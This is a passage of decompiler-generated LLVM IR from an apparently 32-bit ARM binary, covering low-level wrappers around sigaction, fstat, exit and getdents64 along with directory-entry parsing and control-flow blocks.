  %v2_145dc = icmp eq i32 %v2_145d8, 0
  br i1 %v2_145dc, label %dec_label_pc_145e8, label %dec_label_pc_145d8

dec_label_pc_145e8:                               ; preds = %dec_label_pc_145d8
  store i32 %v4_145d8, i32* @r4, align 4
  %v1_1460822 = inttoptr i32 %v4_145d8 to i32*
  %v2_1460823 = load i32, i32* %v1_1460822, align 4
  %v2_1460c25 = icmp eq i32 %v2_1460823, 0
  br i1 %v2_1460c25, label %dec_label_pc_14614, label %dec_label_pc_145f0

dec_label_pc_145f0:                               ; preds = %dec_label_pc_145e8, %dec_label_pc_14608
  %v5_145f4 = phi i32 [ %v2_14608, %dec_label_pc_14608 ], [ %v2_1460823, %dec_label_pc_145e8 ]
  %v2_145f0 = icmp ugt i32 %v5_145f4, 13
  %v7_145f0 = icmp eq i32 %v5_145f4, 14
  %v2_145f4 = xor i1 %v2_145f0, true
  %v3_145f4 = or i1 %v7_145f0, %v2_145f4
  br i1 %v3_145f4, label %bb42, label %bb43

bb42:                                             ; preds = %dec_label_pc_145f0
  %v6_145f4 = and i32 %v5_145f4, 536870912
  %v7_145f4 = icmp ne i32 %v6_145f4, 0
  br label %bb43

bb43:                                             ; preds = %dec_label_pc_145f0, %bb42
  %v1_14600 = phi i1 [ %v2_145f0, %dec_label_pc_145f0 ], [ %v7_145f4, %bb42 ]
  %v2_145f8 = xor i1 %v1_14600, true
  %v3_145f8 = or i1 %v7_145f0, %v2_145f8
  br i1 %v3_145f8, label %bb44, label %dec_label_pc_14608

bb44:                                             ; preds = %bb43
  br label %dec_label_pc_14608

dec_label_pc_14608:                               ; preds = %bb43, %bb44
  call void @__pseudo_cond_branch(i1 %v3_145f8, i32 ptrtoint (i32* @global_var_134b0.655 to i32))
  %v0_14604 = load i32, i32* @r4, align 4
  %v1_14604 = add i32 %v0_14604, 8
  store i32 %v1_14604, i32* @r4, align 4
  %v1_14608 = inttoptr i32 %v1_14604 to i32*
  %v2_14608 = load i32, i32* %v1_14608, align 4
  %v2_1460c = icmp eq i32 %v2_14608, 0
  br i1 %v2_1460c, label %dec_label_pc_14614, label %dec_label_pc_145f0

dec_label_pc_14614:                               ; preds = %dec_label_pc_14608, %dec_label_pc_145e8
  %v1_14618 = call i32 @function_1566c(i32 %v2_14580)
  store i32 %v1_14618, i32* @r0, align 4
  %v1_1461c = call i32 @function_14518(i32 %v1_14618)
  store i32 %v1_1461c, i32* @r0, align 4
  %v2_14628 = icmp eq i32 %tmp37, 0
  br i1 %v2_14628, label %bb45, label %bb46

bb45:                                             ; preds = %dec_label_pc_14614
  br label %bb46

bb46:                                             ; preds = %dec_label_pc_14614, %bb45
  %v0_14638 = phi i32 [ %tmp37, %dec_label_pc_14614 ], [ 4096, %bb45 ]
  %v3_14630 = icmp eq i32 %tmp36, -1
  %v8_14630 = icmp eq i32 %tmp36, -1
  store i32 ptrtoint (i32* @global_var_1e450.597 to i32), i32* @r2, align 4
  store i32 %v0_14638, i32* @global_var_1e450.597, align 4
  br i1 %v3_14630, label %dec_label_pc_14640, label %dec_label_pc_14668

dec_label_pc_14640:                               ; preds = %bb46
  %v0_14640 = call i32 @function_14bcc()
  store i32 %v0_14640, i32* @r0, align 4
  store i32 %v0_14640, i32* @r4, align 4
  %v0_14648 = call i32 @function_14b74()
  %v0_1464c = load i32, i32* @r4, align 4
  %v9_1464c = icmp eq i32 %v0_1464c, %v0_14648
  br i1 %v9_1464c, label %dec_label_pc_14654, label %dec_label_pc_14690

dec_label_pc_14654:                               ; preds = %dec_label_pc_14640
  %v1_14654 = call i32 @function_14ba0(i32 %v0_14648)
  store i32 %v1_14654, i32* @r0, align 4
  store i32 %v1_14654, i32* @r4, align 4
  %v0_1465c = call i32 @function_14b48()
  %v0_14660 = load i32, i32* @r4, align 4
  %v9_14660 = icmp eq i32 %v0_14660, %v0_1465c
  br i1 %v9_14660, label %dec_label_pc_14668, label %dec_label_pc_14690

dec_label_pc_14668:                               ; preds = %dec_label_pc_14654, %bb46
  store i32 %tmp36, i32* @r2, align 4
  br i1 %v8_14630, label %dec_label_pc_146fc, label %dec_label_pc_14674

dec_label_pc_14674:                               ; preds = %dec_label_pc_14668
  %v9_14678 = icmp eq i32 %tmp36, %tmp35
  br i1 %v9_14678, label %dec_label_pc_14680, label %dec_label_pc_14690

dec_label_pc_14680:                               ; preds = %dec_label_pc_14674
  br label %dec_label_pc_14690

dec_label_pc_14690:                               ; preds = %dec_label_pc_14680, %dec_label_pc_14674, %dec_label_pc_14654, %dec_label_pc_14640
  %v2_14698 = call i32 @function_144e0(i32 0, i32 32768)
  %v2_146a4 = call i32 @function_144e0(i32 1, i32 32770)
  %v2_146b0 = call i32 @function_144e0(i32 2, i32 32770)
  br label %dec_label_pc_146fc

dec_label_pc_146fc:                               ; preds = %dec_label_pc_14690, %dec_label_pc_14668
  %v0_146c0 = load i32, i32* %r6.global-to-local, align 4
  %v1_146c0 = inttoptr i32 %v0_146c0 to i32*
  %v2_146c0 = load i32, i32* %v1_146c0, align 4
  store i32 %v2_146c0, i32* @global_var_1e388, align 4
  store i32 %arg5, i32* @global_var_1e454.639, align 4
  %v2_146fc = icmp eq i32 %arg4, 0
  br i1 %v2_146fc, label %dec_label_pc_14738, label %bb47

bb47:                                             ; preds = %dec_label_pc_146fc
  br label %dec_label_pc_14738

dec_label_pc_14738:                               ; preds = %dec_label_pc_146fc, %bb47
  call void @__pseudo_branch(i32 %arg4)
  %v1_14748 = call i32 @function_13470()
  %v2_14750 = inttoptr i32 %v1_14748 to i32*
  store i32 0, i32* %v2_14750, align 4
  %v0_1477c = load i32, i32* %r8.global-to-local, align 4
  call void @__pseudo_branch(i32 %arg1)
  %v1_14788 = call i32 @function_14230(i32 %v0_1477c)
  ret i32 %v1_14788

; uselistorder directives
  uselistorder i32 %v2_14608, { 1, 0 }
  uselistorder i32 %v1_14604, { 1, 0 }
  uselistorder i1 %v2_145f0, { 1, 0 }
  uselistorder i32 %v4_145d8, { 1, 0, 2 }
  uselistorder i32 %storemerge, { 1, 0 }
  uselistorder i32 %tmp36, { 1, 3, 0, 2 }
  uselistorder i32 (i32)* @function_14230, { 0, 6, 5, 4, 7, 3, 2, 1 }
  uselistorder i32 (i32, i32)* @function_144e0, { 2, 1, 0 }
  uselistorder i32* @global_var_1e450.597, { 1, 4, 0, 2, 3 }
  uselistorder i32 4096, { 0, 1, 5, 9, 3, 4, 6, 7, 2, 8, 10, 11 }
  uselistorder i32 536870912, { 1, 0, 2 }
  uselistorder i1 true, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 31, 10, 11, 12, 13, 14, 17, 16, 35, 36, 33, 34, 15, 40, 41, 42, 0, 18, 32, 19, 20, 21, 44, 45, 46, 47, 37, 48, 49, 50, 51, 52, 53, 54, 55, 26, 56, 27, 28, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 25, 71, 72, 73, 74, 75, 76, 24, 77, 30, 78, 38, 39, 29, 79, 22, 23, 43, 80 }
  uselistorder i32 %arg4, { 1, 0 }
  uselistorder label %dec_label_pc_14738, { 1, 0 }
  uselistorder label %bb46, { 1, 0 }
  uselistorder label %dec_label_pc_14608, { 1, 0 }
  uselistorder label %bb43, { 1, 0 }
  uselistorder label %dec_label_pc_145f0, { 1, 0 }
  uselistorder label %bb41, { 1, 0 }
}

define i32 @function_147c0(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_147c0:
  %r0.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-284 = alloca i32, align 4
  %stack_var_-156 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-296 = alloca i32, align 4
  %v3_147c0 = load i32, i32* @r4, align 4
  %v6_147c0 = load i32, i32* @r5, align 4
  store i32 %tmp, i32* @r4, align 4
  %v2_147c4 = icmp eq i32* %arg2, null
  %v2_147c8 = ptrtoint i32* %stack_var_-296 to i32
  store i32 %arg1, i32* %r6.global-to-local, align 4
  store i32 %arg3, i32* @r5, align 4
  br i1 %v2_147c4, label %dec_label_pc_14834, label %dec_label_pc_147d8

dec_label_pc_147d8:                               ; preds = %dec_label_pc_147c0
  %v2_147dc = load i32, i32* %arg2, align 4
  %v4_147dc = add i32 %tmp, 4
  store i32 %v4_147dc, i32* @r1, align 4
  %v2_147e0 = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v2_147e0, i32* @r0, align 4
  store i32 128, i32* @r2, align 4
  store i32 %v2_147dc, i32* %stack_var_-156, align 4
  %v3_147ec = call i32 @function_134b0(i32 %v2_147e0, i32 %v4_147dc, i32 128)
  store i32 %v3_147ec, i32* %r0.global-to-local, align 4
  %v0_147f0 = load i32, i32* @r4, align 4
  %v1_147f0 = add i32 %v0_147f0, 132
  %v2_147f0 = inttoptr i32 %v1_147f0 to i32*
  %v3_147f0 = load i32, i32* %v2_147f0, align 4
  %v1_147f4 = and i32 %v3_147f0, 67108864
  %v2_147f4 = icmp eq i32 %v1_147f4, 0
  br i1 %v2_147f4, label %dec_label_pc_14808, label %bb

bb:                                               ; preds = %dec_label_pc_147d8
  br label %dec_label_pc_14824

dec_label_pc_14808:                               ; preds = %dec_label_pc_147d8
  %v1_14810 = and i32 %v3_147f0, 4
  %v2_14810 = icmp eq i32 %v1_14810, 0
  br i1 %v2_14810, label %bb21, label %bb20

bb20:                                             ; preds = %dec_label_pc_14808
  br label %bb21

bb21:                                             ; preds = %dec_label_pc_14808, %bb20
  br label %dec_label_pc_14824

dec_label_pc_14824:                               ; preds = %bb, %bb21
  %v2_14824 = icmp eq i32 %v0_147f0, 0
  %v3_14828 = ptrtoint i32* %stack_var_-156 to i32
  %.v3_14828 = select i1 %v2_14824, i32 0, i32 %v3_14828
  %v0_14834.pre = load i32, i32* @r5, align 4
  %v0_14844.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_14834

dec_label_pc_14834:                               ; preds = %dec_label_pc_14824, %dec_label_pc_147c0
  %v0_14844 = phi i32 [ %arg1, %dec_label_pc_147c0 ], [ %v0_14844.pre, %dec_label_pc_14824 ]
  %v0_14834 = phi i32 [ %arg3, %dec_label_pc_147c0 ], [ %v0_14834.pre, %dec_label_pc_14824 ]
  %storemerge = phi i32 [ 0, %dec_label_pc_147c0 ], [ %.v3_14828, %dec_label_pc_14824 ]
  store i32 %storemerge, i32* @r1, align 4
  %v2_14834 = icmp eq i32 %v0_14834, 0
  %.v2_147c8 = select i1 %v2_14834, i32 0, i32 %v2_147c8
  store i32 %.v2_147c8, i32* @r2, align 4
  store i32 %v0_14844, i32* %r0.global-to-local, align 4
  %v1_14848 = call i32 @function_148ac(i32 %v0_14844)
  store i32 %v1_14848, i32* %r0.global-to-local, align 4
  %v0_1484c = load i32, i32* @r5, align 4
  %v2_1484c = icmp eq i32 %v0_1484c, 0
  br i1 %v2_1484c, label %bb26, label %bb25

bb25:                                             ; preds = %dec_label_pc_14834
  br label %bb26

bb26:                                             ; preds = %dec_label_pc_14834, %bb25
  %v0_1485c.pr = phi i32 [ 0, %dec_label_pc_14834 ], [ 1, %bb25 ]
  %v1_14854 = icmp slt i32 %v1_14848, 0
  br i1 %v1_14854, label %thread-pre-split.thread, label %thread-pre-split

thread-pre-split.thread:                          ; preds = %bb26
  br label %dec_label_pc_14890

thread-pre-split:                                 ; preds = %bb26
  %v2_1485c = icmp eq i32 %v0_1485c.pr, 0
  store i32 %v1_14848, i32* @r4, align 4
  br i1 %v2_1485c, label %dec_label_pc_14890, label %dec_label_pc_14868

dec_label_pc_14868:                               ; preds = %thread-pre-split
  %v2_14868 = load i32, i32* %stack_var_-296, align 4
  store i32 %v0_1484c, i32* %r0.global-to-local, align 4
  %v2_14870 = inttoptr i32 %v0_1484c to i32*
  store i32 %v2_14868, i32* %v2_14870, align 4
  %v3_14870 = load i32, i32* %r0.global-to-local, align 4
  %v4_14870 = add i32 %v3_14870, 4
  store i32 %v4_14870, i32* @r0, align 4
  %v2_14874 = ptrtoint i32* %stack_var_-284 to i32
  store i32 %v2_14874, i32* @r1, align 4
  store i32 128, i32* @r2, align 4
  %v3_1487c = call i32 @function_134b0(i32 %v4_14870, i32 %v2_14874, i32 128)
  store i32 %v3_1487c, i32* %r0.global-to-local, align 4
  %v1_14884 = load i32, i32* @r5, align 4
  %v2_14884 = add i32 %v1_14884, 136
  %v3_14884 = inttoptr i32 %v2_14884 to i32*
  %v1_1488c = load i32, i32* @r5, align 4
  %v2_1488c = add i32 %v1_1488c, 132
  %v3_1488c = inttoptr i32 %v2_1488c to i32*
  %v0_14890.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_14890

dec_label_pc_14890:                               ; preds = %thread-pre-split.thread, %thread-pre-split, %dec_label_pc_14868
  %v0_14890 = phi i32 [ %v1_14848, %thread-pre-split ], [ %v0_14890.pre, %dec_label_pc_14868 ], [ %v1_14848, %thread-pre-split.thread ]
  store i32 %v0_14890, i32* %r0.global-to-local, align 4
  store i32 %v3_147c0, i32* @r4, align 4
  store i32 %v6_147c0, i32* @r5, align 4
  ret i32 %v0_14890

; uselistorder directives
  uselistorder i32 %v0_14890, { 1, 0 }
  uselistorder i32 %v0_1484c, { 1, 0, 2 }
  uselistorder i32 %v0_14844, { 1, 0 }
  uselistorder i32* %stack_var_-156, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 5, 3, 4, 1, 6, 7, 0 }
  uselistorder label %dec_label_pc_14890, { 2, 1, 0 }
  uselistorder label %bb26, { 1, 0 }
  uselistorder label %dec_label_pc_14824, { 1, 0 }
  uselistorder label %bb21, { 1, 0 }
}

define i32 @function_148ac(i32 %arg1) local_unnamed_addr {
dec_label_pc_148ac:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_148ac = load i32, i32* @r4, align 4
  store i32 %v3_148ac, i32* %stack_var_-8, align 4
  %v1_148b0 = load i32, i32* @r1, align 4
  %v2_148b0 = inttoptr i32 %v1_148b0 to %sigaction*
  %v3_148b0 = load i32, i32* @r2, align 4
  %v4_148b0 = inttoptr i32 %v3_148b0 to %sigaction*
  %v5_148b0 = call i32 @sigaction(i32 %arg1, %sigaction* %v2_148b0, %sigaction* %v4_148b0)
  store i32 %v5_148b0, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v5_148b0, -4095
  br i1 %tmp, label %dec_label_pc_148d0, label %dec_label_pc_148c0

dec_label_pc_148c0:                               ; preds = %dec_label_pc_148ac
  %v0_148c0 = call i32 @function_13470()
  %v0_148c4 = load i32, i32* %r4.global-to-local, align 4
  %v1_148c4 = sub i32 0, %v0_148c4
  %v2_148c8 = inttoptr i32 %v0_148c0 to i32*
  store i32 %v1_148c4, i32* %v2_148c8, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_148d0

dec_label_pc_148d0:                               ; preds = %dec_label_pc_148ac, %dec_label_pc_148c0
  %v0_148d0 = phi i32 [ %v5_148b0, %dec_label_pc_148ac ], [ -1, %dec_label_pc_148c0 ]
  %v2_148d4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_148d4, i32* %r4.global-to-local, align 4
  ret i32 %v0_148d0

; uselistorder directives
  uselistorder i32 %v5_148b0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_148d0, { 1, 0 }
}

; Function Attrs: noreturn
define i32 @function_148d8(i32 %arg1) local_unnamed_addr #0 {
dec_label_pc_148d8:
  store i32 %arg1, i32* @r5, align 4
  call void @exit(i32 %arg1)
  unreachable
}

define i32 @function_14900() local_unnamed_addr {
dec_label_pc_14900:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %tmp4 = bitcast i32* %stack_var_-72 to %stat*
  %v0_14910 = load i32, i32* @r0, align 4
  %v4_14910 = call i32 @fstat(i32 %v0_14910, %stat* %tmp4)
  store i32 %v4_14910, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v4_14910, -4095
  br i1 %tmp, label %dec_label_pc_14934, label %dec_label_pc_14920

dec_label_pc_14920:                               ; preds = %dec_label_pc_14900
  %v0_14920 = call i32 @function_13470()
  %v0_14924 = load i32, i32* %r4.global-to-local, align 4
  %v1_14924 = sub i32 0, %v0_14924
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_1492c = inttoptr i32 %v0_14920 to i32*
  store i32 %v1_14924, i32* %v2_1492c, align 4
  br label %dec_label_pc_14944

dec_label_pc_14934:                               ; preds = %dec_label_pc_14900
  %v2_14934 = icmp eq i32 %v4_14910, 0
  store i32 84292, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_14934, i32 ptrtoint (i32* @global_var_1501c.671 to i32))
  br label %dec_label_pc_14944

dec_label_pc_14944:                               ; preds = %dec_label_pc_14920, %dec_label_pc_14934
  %v0_14944 = load i32, i32* %r4.global-to-local, align 4
  ret i32 %v0_14944

; uselistorder directives
  uselistorder i32 %v4_14910, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2, 3 }
  uselistorder void (i1, i32)* @__pseudo_cond_branch, { 2, 13, 11, 12, 6, 7, 3, 0, 1, 4, 5, 8, 9, 10 }
  uselistorder label %dec_label_pc_14944, { 1, 0 }
}

define i32 @function_14950(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_14950:
  %ip.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r1, align 4
  %v6_14950 = load i32, i32* @r5, align 4
  store i32 %arg1, i32* @r4, align 4
  %v0_14958 = call i32 @function_149e4()
  store i32 %v0_14958, i32* %r6.global-to-local, align 4
  %tmp8 = icmp slt i32 %v0_14958, 1
  br i1 %tmp8, label %dec_label_pc_149dc, label %dec_label_pc_149c8.preheader

dec_label_pc_149c8.preheader:                     ; preds = %dec_label_pc_14950
  %v5_14960 = load i32, i32* @r4, align 4
  %v7_14960 = add i32 %v5_14960, %v0_14958
  store i32 %v7_14960, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_149c8

dec_label_pc_1496c:                               ; preds = %dec_label_pc_149c8
  %v1_1496c = add i32 %v2_1497c, 16
  %v2_1496c = inttoptr i32 %v1_1496c to i32*
  %v3_1496c = load i32, i32* %v2_1496c, align 4
  store i32 %v3_1496c, i32* @lr, align 4
  %v2_14970 = inttoptr i32 %v1_149cc to i32*
  %v3_14970 = load i32, i32* %v2_14970, align 4
  store i32 %v3_14970, i32* %r2.global-to-local, align 4
  %v1_14974 = add i32 %v2_1497c, 18
  %v2_14974 = inttoptr i32 %v1_14974 to i8*
  %v3_14974 = load i8, i8* %v2_14974, align 1
  %v4_14974 = zext i8 %v3_14974 to i32
  store i32 %v4_14974, i32* %ip.global-to-local, align 4
  %v3_14978 = sdiv i32 %v3_1496c, 256
  store i32 %v3_14978, i32* %r3.global-to-local, align 4
  %v1_1497c = trunc i32 %v3_1496c to i8
  %v4_1497c = inttoptr i32 %v1_149cc to i8*
  store i8 %v1_1497c, i8* %v4_1497c, align 1
  %v0_14980 = load i32, i32* %r2.global-to-local, align 4
  %v1_14980 = load i32, i32* @r4, align 4
  %v2_14980 = add i32 %v1_14980, 4
  %v3_14980 = inttoptr i32 %v2_14980 to i32*
  store i32 %v0_14980, i32* %v3_14980, align 4
  %v0_14984 = load i32, i32* %ip.global-to-local, align 4
  %v1_14984 = trunc i32 %v0_14984 to i8
  %v2_14984 = load i32, i32* @r4, align 4
  %v3_14984 = add i32 %v2_14984, 10
  %v4_14984 = inttoptr i32 %v3_14984 to i8*
  store i8 %v1_14984, i8* %v4_14984, align 1
  %v0_14988 = load i32, i32* %r3.global-to-local, align 4
  %v1_14988 = trunc i32 %v0_14988 to i8
  %v2_14988 = load i32, i32* @r4, align 4
  %v3_14988 = add i32 %v2_14988, 9
  %v4_14988 = inttoptr i32 %v3_14988 to i8*
  store i8 %v1_14988, i8* %v4_14988, align 1
  %v0_1498c = load i32, i32* @r4, align 4
  %v1_1498c = add i32 %v0_1498c, 8
  %v2_1498c = inttoptr i32 %v1_1498c to i8*
  %v3_1498c = load i8, i8* %v2_1498c, align 1
  %v4_1498c = zext i8 %v3_1498c to i32
  store i32 %v4_1498c, i32* %r2.global-to-local, align 4
  %v0_14990 = load i32, i32* @r5, align 4
  %v1_14990 = add i32 %v0_14990, 1
  %v2_14990 = inttoptr i32 %v1_14990 to i8*
  %v3_14990 = load i8, i8* %v2_14990, align 1
  %v4_14990 = zext i8 %v3_14990 to i32
  store i32 %v4_14990, i32* %r3.global-to-local, align 4
  %v4_14994 = mul nuw nsw i32 %v4_14990, 256
  %v5_14994 = or i32 %v4_14994, %v4_1498c
  %v1_14998 = add nsw i32 %v5_14994, -19
  store i32 %v1_14998, i32* @r2, align 4
  %v3_1499c = call i32 @function_134c0(i32 %v1_149d4, i32 %v1_149d0, i32 %v1_14998)
  %v0_149a0 = load i32, i32* @r4, align 4
  %v1_149a0 = add i32 %v0_149a0, 8
  %v2_149a0 = inttoptr i32 %v1_149a0 to i8*
  %v3_149a0 = load i8, i8* %v2_149a0, align 1
  %v4_149a0 = zext i8 %v3_149a0 to i32
  store i32 %v4_149a0, i32* %r3.global-to-local, align 4
  %v0_149a4 = load i32, i32* @r5, align 4
  %v1_149a4 = add i32 %v0_149a4, 1
  %v2_149a4 = inttoptr i32 %v1_149a4 to i8*
  %v3_149a4 = load i8, i8* %v2_149a4, align 1
  %v4_149a4 = zext i8 %v3_149a4 to i32
  store i32 %v0_149a0, i32* @r0, align 4
  %v4_149ac = mul nuw nsw i32 %v4_149a4, 256
  %v5_149ac = or i32 %v4_149ac, %v4_149a0
  store i32 %v5_149ac, i32* @r2, align 4
  store i32 %v0_149a0, i32* @r1, align 4
  %v3_149b4 = call i32 @function_134c0(i32 %v0_149a0, i32 %v0_149a0, i32 %v5_149ac)
  %v0_149b8 = load i32, i32* @r4, align 4
  %v1_149b8 = add i32 %v0_149b8, 8
  %v2_149b8 = inttoptr i32 %v1_149b8 to i8*
  %v3_149b8 = load i8, i8* %v2_149b8, align 1
  %v4_149b8 = zext i8 %v3_149b8 to i32
  store i32 %v4_149b8, i32* %r3.global-to-local, align 4
  %v0_149bc = load i32, i32* @r5, align 4
  %v1_149bc = add i32 %v0_149bc, 1
  %v2_149bc = inttoptr i32 %v1_149bc to i8*
  %v3_149bc = load i8, i8* %v2_149bc, align 1
  %v4_149bc = zext i8 %v3_149bc to i32
  store i32 %v4_149bc, i32* @r2, align 4
  %v4_149c0 = mul nuw nsw i32 %v4_149bc, 256
  %v5_149c0 = or i32 %v4_149c0, %v4_149b8
  store i32 %v5_149c0, i32* %r3.global-to-local, align 4
  %v2_149c4 = add i32 %v5_149c0, %v0_149b8
  store i32 %v2_149c4, i32* @r4, align 4
  %v1_149c8.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_149c8

dec_label_pc_149c8:                               ; preds = %dec_label_pc_149c8.preheader, %dec_label_pc_1496c
  %v1_149c8 = phi i32 [ %v7_14960, %dec_label_pc_149c8.preheader ], [ %v1_149c8.pre, %dec_label_pc_1496c ]
  %v2_1497c = phi i32 [ %v5_14960, %dec_label_pc_149c8.preheader ], [ %v2_149c4, %dec_label_pc_1496c ]
  %v3_149c8 = icmp ult i32 %v2_1497c, %v1_149c8
  %v1_149cc = add i32 %v2_1497c, 8
  store i32 %v1_149cc, i32* @r5, align 4
  %v1_149d0 = add i32 %v2_1497c, 19
  store i32 %v1_149d0, i32* @r1, align 4
  %v1_149d4 = add i32 %v2_1497c, 11
  store i32 %v1_149d4, i32* @r0, align 4
  br i1 %v3_149c8, label %dec_label_pc_1496c, label %dec_label_pc_149dc.loopexit

dec_label_pc_149dc.loopexit:                      ; preds = %dec_label_pc_149c8
  %v0_149dc.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_149dc

dec_label_pc_149dc:                               ; preds = %dec_label_pc_14950, %dec_label_pc_149dc.loopexit
  %v0_149dc = phi i32 [ %v0_149dc.pre, %dec_label_pc_149dc.loopexit ], [ %v0_14958, %dec_label_pc_14950 ]
  store i32 %v6_14950, i32* @r5, align 4
  ret i32 %v0_149dc

; uselistorder directives
  uselistorder i32 %v1_149d4, { 1, 0 }
  uselistorder i32 %v1_149d0, { 1, 0 }
  uselistorder i32 %v1_149cc, { 2, 1, 0 }
  uselistorder i32 %v2_1497c, { 4, 3, 2, 5, 1, 0 }
  uselistorder i32 %v0_149a0, { 1, 3, 0, 2, 4 }
  uselistorder i32 %v3_1496c, { 1, 0, 2 }
  uselistorder i32 %v5_14960, { 1, 0 }
  uselistorder i32 %v0_14958, { 1, 0, 2, 3 }
  uselistorder i32 (i32, i32, i32)* @function_134c0, { 7, 6, 5, 8, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_149dc, { 1, 0 }
  uselistorder label %dec_label_pc_149c8, { 1, 0 }
}

define i32 @function_149e4() local_unnamed_addr {
dec_label_pc_149e4:
  %r1.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %v3_149e8 = load i32, i32* @r4, align 4
  %v9_149e8 = load i32, i32* @r6, align 4
  %v0_149ec = load i32, i32* @r2, align 4
  %v1_149ec = add i32 %v0_149ec, 6
  %v2_149f4 = ptrtoint i32* %stack_var_-60 to i32
  %v1_149f8 = and i32 %v1_149ec, -4
  store i32 %v1_149f8, i32* %r3.global-to-local, align 4
  %v2_149fc = sub i32 %v2_149f4, %v1_149f8
  %v0_14a00 = load i32, i32* @r1, align 4
  store i32 %v0_14a00, i32* %r8.global-to-local, align 4
  store i32 %v0_149ec, i32* %stack_var_-60, align 4
  store i32 %v2_149fc, i32* %sl.global-to-local, align 4
  %v0_14a0c = load i32, i32* @r0, align 4
  %v1_14a10 = inttoptr i32 %v2_149fc to %linux_dirent64*
  store i32 %v2_149fc, i32* %r1.global-to-local, align 4
  %v5_14a14 = call i32 @getdents64(i32 %v0_14a0c, %linux_dirent64* %v1_14a10, i32 %v0_149ec)
  store i32 %v5_14a14, i32* @r6, align 4
  %tmp = icmp ult i32 %v5_14a14, -4095
  br i1 %tmp, label %dec_label_pc_14a38, label %dec_label_pc_14a24

dec_label_pc_14a24:                               ; preds = %dec_label_pc_149e4
  %v0_14a24 = call i32 @function_13470()
  %v0_14a28 = load i32, i32* @r6, align 4
  %v1_14a28 = sub i32 0, %v0_14a28
  store i32 %v1_14a28, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %r6.global-to-local, align 4
  %v2_14a30 = inttoptr i32 %v0_14a24 to i32*
  store i32 %v1_14a28, i32* %v2_14a30, align 4
  %v0_14a40.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_14a40

dec_label_pc_14a38:                               ; preds = %dec_label_pc_149e4
  br i1 false, label %dec_label_pc_14a40, label %dec_label_pc_14a48

dec_label_pc_14a40:                               ; preds = %dec_label_pc_14a38, %dec_label_pc_14a24
  %v0_14a40 = phi i32 [ -1, %dec_label_pc_14a38 ], [ %v0_14a40.pre, %dec_label_pc_14a24 ]
  store i32 %v0_14a40, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_14b3c

dec_label_pc_14a48:                               ; preds = %dec_label_pc_14a38
  store i32 -1, i32* %r3.global-to-local, align 4
  %v0_14a50 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_14a50, i32* @r5, align 4
  %v0_14a54 = load i32, i32* @sp, align 4
  store i32 %v0_14a54, i32* @r4, align 4
  br label %dec_label_pc_14b18

dec_label_pc_14a64:                               ; preds = %dec_label_pc_14b18
  %v2_14b30 = add i32 %v3_14b1c, %v0_14b30
  %v1_14a64 = add i32 %v0_14a68, 17
  %v2_14a64 = inttoptr i32 %v1_14a64 to i8*
  %v3_14a64 = load i8, i8* %v2_14a64, align 1
  %v4_14a64 = zext i8 %v3_14a64 to i32
  %v2_14a68 = inttoptr i32 %v1_14b24 to i8*
  %v3_14a68 = load i8, i8* %v2_14a68, align 1
  %v4_14a68 = zext i8 %v3_14a68 to i32
  %v4_14a6c = mul nuw nsw i32 %v4_14a64, 256
  %v5_14a6c = or i32 %v4_14a68, %v4_14a6c
  %v1_14a70 = add nuw nsw i32 %v5_14a6c, 3
  %v1_14a74 = and i32 %v1_14a70, 131068
  store i32 %v1_14a74, i32* %r3.global-to-local, align 4
  %v2_14a78 = add i32 %v1_14a74, %v2_14ab8
  store i32 %v2_14a78, i32* %sb.global-to-local, align 4
  %v9_14a7c = icmp eq i32 %v2_14a78, %v2_14b30
  %v1_14a80 = and i32 %v1_14a70, 128
  %v2_14a84 = icmp eq i32 %v1_14a80, 0
  %v3_14a84 = or i1 %v9_14a7c, %v2_14a84
  br i1 %v3_14a84, label %dec_label_pc_14ab8, label %dec_label_pc_14a88

dec_label_pc_14a88:                               ; preds = %dec_label_pc_14a64
  store i32 %stack_var_-52.0, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v4_14a98 = call i32 @function_14bf8(i32 %v0_14a0c, i32 %stack_var_-52.0, i32 %stack_var_-48.0, i32 0)
  %v0_14a9c = load i32, i32* @r5, align 4
  %v1_14a9c = load i32, i32* %r8.global-to-local, align 4
